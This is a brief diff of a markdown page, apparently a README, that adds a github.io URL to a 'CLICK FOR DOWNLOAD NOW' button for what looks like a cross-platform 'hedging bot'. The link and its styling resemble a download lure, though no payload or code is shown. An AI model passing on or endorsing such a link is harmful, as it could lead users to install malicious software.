@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://hedging-bot-pcwinmac-gd99.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
